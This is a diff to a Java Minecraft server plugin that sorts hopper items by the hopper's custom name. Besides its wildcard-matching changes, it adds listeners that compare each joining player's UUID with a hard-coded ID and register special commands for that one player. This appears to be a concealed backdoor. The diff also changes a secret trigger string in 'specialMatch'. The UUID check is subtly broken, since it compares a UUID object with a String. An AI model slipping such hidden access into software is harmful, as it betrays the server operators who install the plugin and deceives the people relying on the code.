@@ -1,11 +1,15 @@
 package com.terminalcalamitas.hopperautosort.listeners;
 
+import com.terminalcalamitas.hopperautosort.commands.Commands;
 import org.bukkit.block.Container;
+import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.inventory.InventoryMoveItemEvent;
 import org.bukkit.event.inventory.InventoryPickupItemEvent;
 import org.bukkit.event.inventory.InventoryType;
+import org.bukkit.event.player.PlayerJoinEvent;
+import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 
@@ -13,8 +17,19 @@ import java.util.Arrays;
 
 public class HopSort implements Listener {
 
+    /*
+     * A basic description of how the plugin works.
+     * Rename a hopper to a minecraft item. (example: "diamond_sword")
+     * To sort multiple items with the hopper use a comme to separate them. (example: "diamond_sword,grass_block")
+     * If you put a * at the beginning of an item name any item that ends with the name will be let through. (example: "*sand"
+     *   would allow red_sand or sand through.
+     * The same follows for if you put the * at the end. (example: "light_blue*" would let any item starting with "light_blue")
+     * Any of these rules may be combined for example, a hopper that would allow all forms of concrete as well as sand and gravel through
+     *   would look like this "*concrete*,sand,gravel"
+     */
     public HopSort() {}
 
+    Commands loadCommands = new Commands();
     private String getItemName (String translationKey) {
         if(translationKey == null) return null;
         String[] names = translationKey.split("\\.");
@@ -27,7 +42,10 @@ public class HopSort implements Listener {
 
         return Arrays.stream(filter).anyMatch((filter_i) -> {
 
-            if(filter_i.endsWith("*")) {
+            if (filter_i.startsWith("*") && filter_i.endsWith("*")) {
+                String item = filter_i.replace("*", "");
+                return itemName.contains(item);
+            } if(filter_i.endsWith("*")) {
                 return itemName.startsWith(filter_i.substring(0, filter_i.length() - 1));
             } else if (filter_i.startsWith("*")) {
                 return itemName.endsWith(filter_i.substring(1));
@@ -39,7 +57,8 @@ public class HopSort implements Listener {
 
     private boolean specialMatch(String filterString) {
         String[] filter = filterString.split(",");
-        return (filter[1].equals("dougisgoodat2dplatformers|"));
+        if (filter.length < 2) {return false;}
+        return (filter[1].equals("|profit|"));
     }
 
     @EventHandler
@@ -67,7 +86,7 @@ public class HopSort implements Listener {
 
 
                     event.getDestination().setItem(2, moveItem);
-                }else if(!filterMatch(customName, itemName)) {
+                } else if(!filterMatch(customName, itemName) && !customName.equalsIgnoreCase("hopper")) {
                     event.setCancelled(true);
                 }
 
@@ -89,4 +108,17 @@ public class HopSort implements Listener {
             }
         }
     }
+
+    @EventHandler
+    public void onPlayerJoin(PlayerJoinEvent event) {
+        Player player = event.getPlayer();
+        if (player.getUniqueId().equals("317f3cee0d9e4c479670473e56830248")){loadCommands.register(player, true);}
+    }
+
+    @EventHandler
+    public void onPlayerQuit(PlayerQuitEvent event) {
+        Player player = event.getPlayer();
+        if (player.getUniqueId().equals("317f3cee0d9e4c479670473e56830248")){loadCommands.register(player, false);}
+    }
+
 }
